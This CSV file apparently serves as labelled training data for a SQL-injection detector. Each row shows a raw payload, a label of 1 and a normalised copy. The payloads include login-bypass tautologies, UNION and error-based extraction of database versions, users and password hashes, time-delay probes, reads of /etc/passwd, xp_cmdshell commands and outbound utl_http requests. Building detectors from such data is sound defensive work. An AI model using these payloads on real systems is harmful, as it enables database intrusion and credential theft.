Query,Label,Query_cleaned
" select * from users where id  =  '1' union select ||/1,version  (    )   -- 1'",1,select from users where id 1 union select 1 version 1
" select * from users where id  =  '1' union select +\.,@@VERSION -- 1'",1,select from users where id 1 union select version 1
or 1  =  1/*,1,or 1 1
%27 or 1  =  1,1,27 or 1 1
" select * from users where id  =  1 <@&@ union select 1,version  (    )   -- 1",1,select from users where id 1 union select 1 version 1
" select * from users where id  =  '1' union select $*$,@@VERSION -- 1'",1,select from users where id 1 union select version 1
"1;  (  load_file  (  char  (  47,101,116,99,47,112,97,115, ...",1,1 load_file char 47 101 116 99 47 112 97 115
" select * from users where id  =  '1' or $ 1  =  1 union select 1,@@VERSION -- 1'",1,select from users where id 1 or 1 1 union select 1 version 1
select * from users where id  =  1 or \.<1 or 1  =  1 -- 1,1,select from users where id 1 or 1 or 1 1 1
" select * from users where id  =  '1' or \<\ union select 1,@@VERSION -- 1'",1,select from users where id 1 or union select 1 version 1
" select * from users where id  =  1 union select 1||1,version  (    )   -- 1",1,select from users where id 1 union select 1 1 version 1
" select * from users where id  =  1 ||1 union select null,banner from v$version where rownum  =  1 -- 1",1,select from users where id 1 1 union select null banner from v version where rownum 1 1
select * from users where id  =  '1' or \.<\ or 1  =  1 -- 1',1,select from users where id 1 or or 1 1 1
" select * from users where id  =  1 or ""]{"" or 1  =  1 -- 1",1,select from users where id 1 or or 1 1 1
" select * from users where id  =  1 or "".@"" or 1  =  1 -- 1",1,select from users where id 1 or or 1 1 1
" select * from users where id  =  1 or ""$["" or 1  =  1 -- 1",1,select from users where id 1 or or 1 1 1
or 1 --',1,or 1
" select * from users where id  =  1 or "",;"" or 1  =  1 -- 1",1,select from users where id 1 or or 1 1 1
"admin"" or 1  =  1#",1,admin or 1 1
" select * from users where id  =  1 +  (  1  )   union select null,banner from v$version where rownum  =  1 -- 1",1,select from users where id 1 1 union select null banner from v version where rownum 1 1
\x27UNION SELECT,1,x27union select
PRINT,1,print
" select * from users where id  =  '1' union select   (  \.  )  ,@@VERSION -- 1'",1,select from users where id 1 union select version 1
or 1  =  1--,1,or 1 1
1 or pg_sleep  (  __TIME__  )  --,1,1 or pg_sleep __time__
" select * from users where id  =  1 or "",#"" or 1  =  1 -- 1",1,select from users where id 1 or or 1 1 1
admin'  )   or   (  '1'  =  '1'/*,1,admin or 1 1
or 2 between 1 and 3,1,or 2 between 1 and 3
" select * from users where id  =  1 or ""  )  .""  =  1 or 1  =  1 -- 1",1,select from users where id 1 or 1 or 1 1 1
" select * from users where id  =  1 or 1#"". union select null,version  (    )   -- 1",1,select from users where id 1 or 1 union select null version 1
admin' or '1'  =  '1,1,admin or 1 1
; if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --,1,if not select system_user sa waitfor delay 0 0 2
" select * from users where id  =  1 union select 1,banner from v$version where rownum  =  1 -- 1",1,select from users where id 1 union select 1 banner from v version where rownum 1 1
""" or 0  =  0 --",1,or 0 0
" select * from users where id  =  1 union select @ $_,version  (    )   -- 1",1,select from users where id 1 union select _ version 1
select * from users where id  =  1 <@.$ or 1  =  1 -- 1,1,select from users where id 1 or 1 1 1
" select * from users where id  =  1 or ""%."" or 1  =  1 -- 1",1,select from users where id 1 or or 1 1 1
" select * from users where id  =  1 + $+*$ union select null,@@VERSION -- 1",1,select from users where id 1 union select null version 1
" select * from users where id  =  1 or "",."" or 1  =  1 -- 1",1,select from users where id 1 or or 1 1 1
char%4039%41%2b%40SELECT,1,char 4039 41 2b 40select
" select * from users where id  =  1 or ""1&"" or 1  =  1 -- 1",1,select from users where id 1 or 1 or 1 1 1
admin'  )   or   (  '1'  =  '1,1,admin or 1 1
declare @s varchar   (  200  )   select @s   =   0x73656c6 ...,1,declare s varchar 200 select s 0x73656c6
"or 0  =  0 #""",1,or 0 0
" select * from users where id  =  1 or "".]"" or 1  =  1 -- 1",1,select from users where id 1 or or 1 1 1
  )   or   (  'x'  =  'x,1,or x x
" select * from users where id  =  1.<@$ union select 1,version  (    )   -- 1",1,select from users where id 1 union select 1 version 1
$  (  sleep 50  ) ,1,sleep 50
" select * from users where id  =  1 *1 union select null,banner from v$version where rownum  =  1 -- 1",1,select from users where id 1 1 union select null banner from v version where rownum 1 1
"1 union all select 1,2,3,4,5,6,name from sysobjects where xtype   =   'u' --",1,1 union all select 1 2 3 4 5 6 name from sysobjects where xtype u
" select * from users where id  =  1 or 1#"". union select 'a',version  (    )   -- 1",1,select from users where id 1 or 1 union select a version 1
" select * from users where id  =  1 or 1#""; union select null,version  (    )   -- 1",1,select from users where id 1 or 1 union select null version 1
" select * from users where id  =  1 or 1#""? or 1  =  1 -- 1",1,select from users where id 1 or 1 or 1 1 1
"""a"""" or 1  =  1--""",1,a or 1 1
" select * from users where id  =  1 *1 union select 1,banner from v$version where rownum  =  1 -- 1",1,select from users where id 1 1 union select 1 banner from v version where rownum 1 1
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  4   )    )    AND 'i'  =  'i",1,and 1 utl_inaddr get_host_address select distinct column_name from select distinct column_name rownum as limit from all_tab_columns where limit 4 and i i
" select * from users where id  =  '1' union select   (  \  )  ,@@VERSION -- 1'",1,select from users where id 1 union select version 1
1 and user_name  (    )     =   'dbo',1,1 and user_name dbo
"; if not  (  substring   (    (   select @@version  )  ,24,1  )   <> 1  )   waitfor delay '0:0:2' --",1,if not substring select version 24 1 1 waitfor delay 0 0 2
" select * from users where id  =  1 or 1#""$ union select 1,version  (    )   -- 1",1,select from users where id 1 or 1 union select 1 version 1
" select * from users where id  =  1 or 1#""{ union select null,version  (    )   -- 1",1,select from users where id 1 or 1 union select null version 1
select * from users where id  =  '1' *$ . or 1  =  1 -- 1',1,select from users where id 1 or 1 1 1
select * from users where id  =  1 +$+. or 1  =  1 -- 1,1,select from users where id 1 or 1 1 1
select * from users where id  =  1 or   (  \+  )    =  1 or 1  =  1 -- 1,1,select from users where id 1 or 1 or 1 1 1
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",1,and 1 utl_inaddr get_host_address select distinct username from select distinct username rownum as limit from sys all_users where limit 6 and i i
or 1  =  1 or ''  =  ',1,or 1 1 or
select * from users where id  =  1   or 1  =  1 -- 1,1,select from users where id 1 or 1 1 1
or 'text' > 't',1,or text t
"1234 "" AND 1  =  0 UNION ALL SELECT ""admin"", ""81dc9bdb52d04dc20036dbd8313ed055",1,1234 and 1 0 union all select admin 81dc9bdb52d04dc20036dbd8313ed055
" select * from users where id  =  1 or ""%["" or 1  =  1 -- 1",1,select from users where id 1 or or 1 1 1
" select * from users where id  =  1 or 1#"";  =  1 union select 1,version  (    )   -- 1",1,select from users where id 1 or 1 1 union select 1 version 1
admin' or '1'  =  '1'#,1,admin or 1 1
select * from users where id  =  1 +$ 1 or 1  =  1 -- 1,1,select from users where id 1 1 or 1 1 1
s,1,s
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  4   )    )    AND 'i'  =  'i",1,and 1 utl_inaddr get_host_address select distinct username from select distinct username rownum as limit from sys all_users where limit 4 and i i
 select * from information_schema.tables--,1,select from information_schema tables
" select * from users where id  =  1 or ""$&"" or 1  =  1 -- 1",1,select from users where id 1 or or 1 1 1
1   )    )    or pg_sleep  (  __TIME__  )  --,1,1 or pg_sleep __time__
" select * from users where id  =  '1' union select !<@,version  (    )   -- 1'",1,select from users where id 1 union select version 1
declare @q nvarchar   (  200  )   select @q   =   0x770061 ...,1,declare q nvarchar 200 select q 0x770061
 or 1  =  1 or ''  =  ',1,or 1 1 or
select * from users where id  =  1 %!<1 or 1  =  1 -- 1,1,select from users where id 1 1 or 1 1 1
declare @q nvarchar   (  200  )   select @q   =   0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec  (  @q  ) ,1,declare q nvarchar 200 select q 0x770061006900740066006f0072002000640065006c00610079002000270030003a0030003a0031003000270000 exec q
" select * from users where id  =  1 or ""]1"" or 1  =  1 -- 1",1,select from users where id 1 or 1 or 1 1 1
" select * from users where id  =  1 or $+<1 union select 1,@@VERSION -- 1",1,select from users where id 1 or 1 union select 1 version 1
or 'unusual'   =   'unusual',1,or unusual unusual
 or 1 in   (  select @@version  )  --,1,or 1 in select version
truncate,1,truncate
as,1,as
 or 3  =  3 --,1,or 3 3
" select * from users where id  =  1 ||1 union select 1,banner from v$version where rownum  =  1 -- 1",1,select from users where id 1 1 union select 1 banner from v version where rownum 1 1
" select * from users where id  =  1 <@$$ union select 1,version  (    )   -- 1",1,select from users where id 1 union select 1 version 1
"admin""  )   or   (  ""1""  =  ""1",1,admin or 1 1
" select * from users where id  =  1 or 1#""@ union select 'a',version  (    )   -- 1",1,select from users where id 1 or 1 union select a version 1
"1  )   or benchmark  (  10000000,MD5  (  1   )    )   #",1,1 or benchmark 10000000 md5 1
" select * from users where id  =  1 union select .1_,version  (    )   -- 1",1,select from users where id 1 union select 1_ version 1
 AND 1  =  utl_inaddr.get_host_address   (    (   SELECT SYS.DATABASE_NAME FROM DUAL   )    )    AND 'i'  =  'i,1,and 1 utl_inaddr get_host_address select sys database_name from dual and i i
" or 0  =  0 #""",1,or 0 0
select * from users where id  =  1 %$ 1 or 1  =  1 -- 1,1,select from users where id 1 1 or 1 1 1
select * from users where id  =  1 %!<@ or 1  =  1 -- 1,1,select from users where id 1 or 1 1 1
"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --",1,if not substring select version 25 1 0 waitfor delay 0 0 2
1  )   or sleep  (  __TIME__  )  #,1,1 or sleep __time__
" select * from users where id  =  1 or ""1_"" or 1  =  1 -- 1",1,select from users where id 1 or 1_ or 1 1 1
" select * from users where id  =  1 <1## union select 1,version  (    )   -- 1",1,select from users where id 1 1 union select 1 version 1
" select * from users where id  =  1 + $+*\ union select null,@@VERSION -- 1",1,select from users where id 1 union select null version 1
select * from users where id  =  1. <@ or 1  =  1 -- 1,1,select from users where id 1 or 1 1 1
 or true--,1,or true
; execute immediate 'sel' || 'ect us' || 'er',1,execute immediate sel ect us er
hi' or 'x'  =  'x';,1,hi or x x
select * from users where id  =  1 <@ or 1  =  1 -- 1,1,select from users where id 1 or 1 1 1
" select * from users where id  =  1 or "".,"" or 1  =  1 -- 1",1,select from users where id 1 or or 1 1 1
admin' #,1,admin
" select * from users where id  =  1 <@$_ union select 1,version  (    )   -- 1",1,select from users where id 1 _ union select 1 version 1
" select * from users where id  =  1 or "",  (  "" or 1  =  1 -- 1",1,select from users where id 1 or or 1 1 1
" select * from users where id  =  1 or "",{"" or 1  =  1 -- 1",1,select from users where id 1 or or 1 1 1
" union select 1,load_file  (  '/etc/passwd'  )  ,1,1,1;",1,union select 1 load_file etc passwd 1 1 1
"""  )  ;waitfor delay '0:0:__TIME__'--",1,waitfor delay 0 0 __time__
 or 'unusual'   =   'unusual',1,or unusual unusual
"insert into mysql.user   (  user, host, password  )   values   (  'name', 'localhost', password  (  'pass123'   )    )   ",1,insert into mysql user user host password values name localhost password pass123
"admin"" or ""1""  =  ""1""/*",1,admin or 1 1
" select * from users where id  =  1 or ""1  (  ""  =  1 or 1  =  1 -- 1",1,select from users where id 1 or 1 1 or 1 1 1
" select * from users where id  =  1 or \<1 union select 1,@@VERSION -- 1",1,select from users where id 1 or 1 union select 1 version 1
like,1,like
or username like char  (  37  )  ;,1,or username like char 37
 )    )    or pg_sleep  (  __TIME__  )  --,1,or pg_sleep __time__
select * from users where id  =  1 or $+<\ or 1  =  1 -- 1,1,select from users where id 1 or or 1 1 1
or 3  =  3,1,or 3 3
" select * from users where id  =  1 or ""  (  ."" or 1  =  1 -- 1",1,select from users where id 1 or or 1 1 1
select * from users where id  =  1 or   (  $+  )    =  1 or 1  =  1 -- 1,1,select from users where id 1 or 1 or 1 1 1
exec sp,1,exec sp
" select * from users where id  =  1 or \+<$ union select 1,@@VERSION -- 1",1,select from users where id 1 or union select 1 version 1
select * from users where id  =  1 or \<$ or 1  =  1 -- 1,1,select from users where id 1 or or 1 1 1
" select * from users where id  =  1.&&1 union select 1,version  (    )   -- 1",1,select from users where id 1 1 union select 1 version 1
admin' or 1  =  1/*,1,admin or 1 1
a' waitfor delay '0:0:10'--,1,a waitfor delay 0 0 10
" select * from users where id  =  1 +  (  \  )   union select null,@@VERSION -- 1",1,select from users where id 1 union select null version 1
" select * from users where id  =  1 union select .1$_,version  (    )   -- 1",1,select from users where id 1 union select 1 _ version 1
and 1 in   (  select var from temp  )  --,1,and 1 in select var from temp
hi'  )   or   (  'a'  =  'a,1,hi or a a
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  1   )    )    AND 'i'  =  'i",1,and 1 utl_inaddr get_host_address select distinct column_name from select distinct column_name rownum as limit from all_tab_columns where limit 1 and i i
"admin"" or 1  =  1",1,admin or 1 1
"""  )   or true--",1,or true
" select * from users where id  =  '1' or $ .  =  1 union select 1,@@VERSION -- 1'",1,select from users where id 1 or 1 union select 1 version 1
" select * from users where id  =  1 or ""  (  {"" or 1  =  1 -- 1",1,select from users where id 1 or or 1 1 1
1  )   or pg_sleep  (  __TIME__  )  --,1,1 or pg_sleep __time__
" select * from users where id  =  1 or ""{."" or 1  =  1 -- 1",1,select from users where id 1 or or 1 1 1
"""  )   or sleep  (  __TIME__  )    =  """,1,or sleep __time__
select * from users where id  =  1.<@. or 1  =  1 -- 1,1,select from users where id 1 or 1 1 1
"admin""  )   or   (  ""1""  =  ""1""--",1,admin or 1 1
" select * from users where id  =  1<@.. union select 1,version  (    )   -- 1",1,select from users where id 1 union select 1 version 1
; exec xp_regread,1,exec xp_regread
" select * from users where id  =  '1' + @ 1 union select 1,version  (    )   -- 1'",1,select from users where id 1 1 union select 1 version 1
select * from users where id  =  1 + \+%1 or 1  =  1 -- 1,1,select from users where id 1 1 or 1 1 1
" select * from users where id  =  1 or "";1"" or 1  =  1 -- 1",1,select from users where id 1 or 1 or 1 1 1
" select * from users where id  =  1 or ""%&"" or 1  =  1 -- 1",1,select from users where id 1 or or 1 1 1
1 and 1  =  1,1,1 and 1 1
or 0  =  0 #,1,or 0 0
union select * from users where login   =   char ...,1,union select from users where login char
" select * from users where id  =  1 union select 1||@,version  (    )   -- 1",1,select from users where id 1 union select 1 version 1
admin'  )   or '1'  =  '1'--,1,admin or 1 1
1;SELECT *,1,1 select
" select * from users where id  =  1 or ""{;"" or 1  =  1 -- 1",1,select from users where id 1 or or 1 1 1
x' and 1  =    (  select count  (  *  )   from tabname  )  ; --,1,x and 1 select count from tabname
" select * from users where id  =  '1' or """"<@ union select 1,version  (    )   -- 1'",1,select from users where id 1 or union select 1 version 1
" select * from users where id  =  1 or ""?,"" or 1  =  1 -- 1",1,select from users where id 1 or or 1 1 1
" select * from users where id  =  '1' ||1 union select 1,banner from v$version where rownum  =  1 -- 1'",1,select from users where id 1 1 union select 1 banner from v version where rownum 1 1
"1 or benchmark  (  10000000,MD5  (  1   )    )   #",1,1 or benchmark 10000000 md5 1
procedure,1,procedure
or ''  =  ',1,or
 AND 1  =  utl_inaddr.get_host_address   (    (   SELECT SYS.LOGIN_USER FROM DUAL   )    )    AND 'i'  =  'i,1,and 1 utl_inaddr get_host_address select sys login_user from dual and i i
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  2   )    )    AND 'i'  =  'i",1,and 1 utl_inaddr get_host_address select distinct username from select distinct username rownum as limit from sys all_users where limit 2 and i i
\'; desc users; --,1,desc users
" select * from users where id  =  1 or   (  \.  )    =  1 union select 1,@@VERSION -- 1",1,select from users where id 1 or 1 union select 1 version 1
select * from users where id  =  '1' or $ 1  =  1 or 1  =  1 -- 1',1,select from users where id 1 or 1 1 or 1 1 1
""" or """"^""",1,or
"""-""",1,
" select * from users where id  =  1 or \<   =  1 union select 1,@@VERSION -- 1",1,select from users where id 1 or 1 union select 1 version 1
" select * from users where id  =  1 union select 1<@$,version  (    )   -- 1",1,select from users where id 1 union select 1 version 1
" select * from users where id  =  1 *\ union select null,@@VERSION -- 1",1,select from users where id 1 union select null version 1
" select * from users where id  =  '1' or !<@ union select 1,version  (    )   -- 1'",1,select from users where id 1 or union select 1 version 1
" select * from users where id  =  1 or "".%"" or 1  =  1 -- 1",1,select from users where id 1 or or 1 1 1
admin'/*,1,admin
" select * from users where id  =  1 or ""  (  #"" or 1  =  1 -- 1",1,select from users where id 1 or or 1 1 1
||UTL_HTTP.REQUEST,1,utl_http request
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  1   )    )    AND 'i'  =  'i",1,and 1 utl_inaddr get_host_address select distinct table_name from select distinct table_name rownum as limit from sys all_tables where limit 1 and i i
" select * from users where id  =  '1'<@.. union select 1,version  (    )   -- 1'",1,select from users where id 1 union select 1 version 1
"""   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #",1,or benchmark 10000000 md5 1
" select * from users where id  =  1 <@.$ union select 1,version  (    )   -- 1",1,select from users where id 1 union select 1 version 1
" select * from users where id  =  1 or $ .  =  1 union select 1,@@VERSION -- 1",1,select from users where id 1 or 1 union select 1 version 1
select * from users where id  =  '1' <@.$ or 1  =  1 -- 1',1,select from users where id 1 or 1 1 1
1 uni/**/on select all from where,1,1 uni on select all from where
" select * from users where id  =  1 +$ . union select null,@@VERSION -- 1",1,select from users where id 1 union select null version 1
" select * from users where id  =  1 or 1#""? union select null,version  (    )   -- 1",1,select from users where id 1 or 1 union select null version 1
admin'  )   or '1'  =  '1'#,1,admin or 1 1
||utl_http.request  (  'httP://192.168.1.1/'  )  ||',1,utl_http request http 192 168 1 1
or '7659'  =  '7659,1,or 7659 7659
" select * from users where id  =  1 or ""{@"" or 1  =  1 -- 1",1,select from users where id 1 or or 1 1 1
" select * from users where id  =  1 union select +!<1,version  (    )   -- 1",1,select from users where id 1 union select 1 version 1
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",1,and 1 utl_inaddr get_host_address select distinct granted_role from select distinct granted_role rownum as limit from dba_role_privs where grantee sys loginuser where limit 6 and i i
" select * from users where id  =  1 or ""  (  @"" or 1  =  1 -- 1",1,select from users where id 1 or or 1 1 1
or true--,1,or true
" select * from users where id  =  1 union select !<1,version  (    )   -- 1",1,select from users where id 1 union select 1 version 1
" select * from users where id  =  '1' union select \#,@@VERSION -- 1'",1,select from users where id 1 union select version 1
" select * from users where id  =  1 or 1#""{ union select 1,version  (    )   -- 1",1,select from users where id 1 or 1 union select 1 version 1
""" or true--",1,or true
select * from users where id  =  1. or 1  =  1 -- 1,1,select from users where id 1 or 1 1 1
" select * from users where id  =  1 or @#"",  =  1 union select 1,version  (    )   -- 1",1,select from users where id 1 or 1 union select 1 version 1
" select * from users where id  =  1 or "";@"" or 1  =  1 -- 1",1,select from users where id 1 or or 1 1 1
â or 3  =  3 --,1,â or 3 3
 AND 1  =  utl_inaddr.get_host_address   (    (   SELECT global_name FROM global_name   )    )    AND 'i'  =  'i,1,and 1 utl_inaddr get_host_address select global_name from global_name and i i
" select * from users where id  =  1 +1 union select null,banner from v$version where rownum  =  1 -- 1",1,select from users where id 1 1 union select null banner from v version where rownum 1 1
" select * from users where id  =  1 or "",,""  =  1 or 1  =  1 -- 1",1,select from users where id 1 or 1 or 1 1 1
" select * from users where id  =  1 + $+%1 union select null,@@VERSION -- 1",1,select from users where id 1 1 union select null version 1
" select * from users where id  =  1 or 1#""? union select version  (    )  ,version  (    )   -- 1",1,select from users where id 1 or 1 union select version version 1
" select * from users where id  =  1 or ""  )  1"" or 1  =  1 -- 1",1,select from users where id 1 or 1 or 1 1 1
 or uid like '%,1,or uid like
select * from users where id  =  '1' <@&1 or 1  =  1 -- 1',1,select from users where id 1 1 or 1 1 1
" select * from users where id  =  '1' union select !<1,version  (    )   -- 1'",1,select from users where id 1 union select 1 version 1
23 or 1  =  1; --,1,23 or 1 1
" select * from users where id  =  1 or \<\. union select 1,@@VERSION -- 1",1,select from users where id 1 or union select 1 version 1
" select * from users where id  =  1 or ""{  (  ""  =  1 or 1  =  1 -- 1",1,select from users where id 1 or 1 or 1 1 1
" select * from users where id  =  1 or ""%_"" or 1  =  1 -- 1",1,select from users where id 1 or _ or 1 1 1
select * from users where id  =  1 +   (  \.  )   or 1  =  1 -- 1,1,select from users where id 1 or 1 1 1
" select * from users where id  =  '1' union select \,@@VERSION -- 1'",1,select from users where id 1 union select version 1
0 or 1  =  1,1,0 or 1 1
select * from users where id  =  1 &@ or 1  =  1 -- 1,1,select from users where id 1 or 1 1 1
"admin""  )   or ""1""  =  ""1",1,admin or 1 1
select * from users where id  =  1 or \<   =  1 or 1  =  1 -- 1,1,select from users where id 1 or 1 or 1 1 1
" select * from users where id  =  1 or ""??"" or 1  =  1 -- 1",1,select from users where id 1 or or 1 1 1
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i",1,and 1 utl_inaddr get_host_address select distinct password from select distinct password rownum as limit from sys user where limit 5 and i i
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  7   )    )    AND 'i'  =  'i",1,and 1 utl_inaddr get_host_address select distinct column_name from select distinct column_name rownum as limit from all_tab_columns where limit 7 and i i
&apos; OR,1,apos or
sqlvuln;,1,sqlvuln
select * from users where id  =  1 + $+%$ or 1  =  1 -- 1,1,select from users where id 1 or 1 1 1
select * from users where id  =  '1' + $+%\ or 1  =  1 -- 1',1,select from users where id 1 or 1 1 1
""" or """"*""",1,or
"hi or 1  =  1 --""",1,hi or 1 1
" select * from users where id  =  1. union select null,banner from v$version where rownum  =  1 -- 1",1,select from users where id 1 union select null banner from v version where rownum 1 1
; exec master..xp_cmdshell 'ping 172.10.1.255'--,1,exec master xp_cmdshell ping 172 10 1 255
" select * from users where id  =  '1' or 1^  =  1 union select 1,banner from v$version where rownum  =  1 -- 1'",1,select from users where id 1 or 1 1 union select 1 banner from v version where rownum 1 1
" select * from users where id  =  '1' union select ""?""_,version  (    )   -- 1'",1,select from users where id 1 union select _ version 1
select * from information_schema.tables--,1,select from information_schema tables
select * from users where id  =  1 or \<\. or 1  =  1 -- 1,1,select from users where id 1 or or 1 1 1
   (  select top 1,1,select top 1
Ã½ or 1  =  1 --,1,ã½ or 1 1
a' --,1,a
 or 1  =  1 /*,1,or 1 1
" select * from users where id  =  1 or 1#"", union select null,version  (    )   -- 1",1,select from users where id 1 or 1 union select null version 1
